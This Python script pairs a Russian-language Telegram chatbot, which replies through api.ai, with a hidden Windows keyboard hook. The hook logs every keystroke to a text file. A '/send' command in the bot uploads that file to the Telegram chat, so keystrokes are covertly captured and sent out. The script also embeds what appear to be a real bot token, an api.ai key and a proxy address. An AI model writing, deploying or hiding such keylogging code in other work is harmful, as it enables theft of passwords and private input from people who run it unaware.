from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import apiai, json


import sys
from ctypes import *
from ctypes.wintypes import MSG

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162
file1 = open('text.txt', 'a',encoding='utf-8')






import logging

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
updater = Updater('460665268:AAHAWarCvJKl1uxICkWCVVVBTKftpiqK9AM', request_kwargs={'proxy_url': 'socks5://67.205.180.3:1080'})
dispatcher = updater.dispatcher
# Обработка команд
def startCommand(bot, update):
    bot.send_message(chat_id=update.message.chat_id, text='Привет, давай пообщаемся?')

def filesend(bot,update):
    bot.send_document(chat_id=update.message.chat.id, document=open('text.txt', 'rb'))

def textMessage(bot, update):
    request = apiai.ApiAI('6701ec81e0fc4a0ca89c53d20ccdc249').text_request() #
    request.lang = 'ru'
    request.session_id = 'BatlabAIBot'
    request.query = update.message.text
    responseJson = json.loads(request.getresponse().read().decode('utf-8'))
    response = responseJson['result']['fulfillment']['speech']

    if response:
        bot.send_message(chat_id=update.message.chat_id, text=response)
    else:
        bot.send_message(chat_id=update.message.chat_id, text='Я Вас не совсем понял!')


start_command_handler = CommandHandler('start', startCommand)
text_message_handler = MessageHandler(Filters.text, textMessage)
dispatcher.add_handler(CommandHandler('send',filesend))
dispatcher.add_handler(start_command_handler)
dispatcher.add_handler(text_message_handler)

updater.start_polling(clean=True)

updater.idle()



class KeyLogger:

    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    def installHookProc(self, pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL,pointer,kernel32.GetModuleHandleW(None),0)
        if not self.hooked:
            return False
        return True

    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)


def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)
    hookedKey = chr(lParam[0])
    print("Hookedkey=" + hookedKey + ", KeyCode=" + str(lParam[0]),file=file1)
    if (CTRL_CODE == int(lParam[0])):
        print("Ctrl pressed, call uninstallHook()")
        KeyLogger.uninstallHookProc()
        file1.close()
        sys.exit(0)
    return user32.CallNextHookEx(KeyLogger.hooked, nCode, wParam, lParam)


def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)


KeyLogger = KeyLogger()
pointer = getFPTR(hookProc)
if KeyLogger.installHookProc(pointer):
    print("Hook installed")

startKeyLog()